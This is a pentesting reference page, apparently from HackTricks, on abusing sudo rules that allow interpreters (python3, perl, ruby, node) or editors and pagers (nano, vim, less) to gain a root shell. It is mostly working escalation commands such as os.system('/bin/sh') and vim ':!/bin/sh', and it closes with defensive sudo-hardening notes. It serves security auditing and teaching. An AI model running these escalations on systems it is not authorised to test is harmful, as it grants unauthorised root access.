# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudo-allowed interpreters

If `sudo -l` allows a user to run an interpreter as root, treat it as direct code execution. Interpreters are designed to execute arbitrary code, so a rule that allows `python3`, `perl`, `ruby`, `lua`, `node`, or similar binaries is usually equivalent to root command execution unless the arguments are tightly constrained and validated.

Common review flow:

```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```

Other interpreter examples:

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```

The exact path matters. If the sudo rule allows `/usr/bin/python3`, use that exact path during validation:

```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```

## Sudo-allowed editors

If `sudo -l` allows a user to run an interactive editor as root, treat it as a command-execution surface, not as a harmless file-editing permission. Editors can often execute shell commands, read arbitrary files, write arbitrary files, or invoke external helpers from inside the editor.

Common review flow:

```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```

### Nano command execution

When `nano` is allowed through sudo, command execution may be reachable from the editor interface:

```text
Ctrl+R
Ctrl+X
```

Then provide a command such as:

```bash
id
/bin/sh
```

On some terminals, an interactive shell may need standard streams redirected:

```bash
reset; /bin/sh 1>&0 2>&0
```

The exact key sequence can vary with nano version and build options, but the security issue is the same: the editor is running as root and can invoke external commands.

### Other common editor escapes

Vim-style editors commonly expose command execution through `:!`:

```text
:!/bin/sh
```

Pagers such as `less` can also expose shell execution:

```text
!/bin/sh
```

## Defensive notes

- Avoid granting interpreters or interactive editors through sudo.
- Prefer fixed, root-owned wrappers that perform one narrow administrative action.
- If an interpreter is unavoidable, restrict the exact script path and prevent user-controlled arguments, writable imports, `PYTHONPATH`, and unsafe environment preservation.
- If file editing is required, restrict the exact file path and consider `sudoedit` with patched sudo versions and strict environment handling.
- Review `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty`, and logging, but do not treat them as a complete sandbox.
{{#include ../../banners/hacktricks-training.md}}
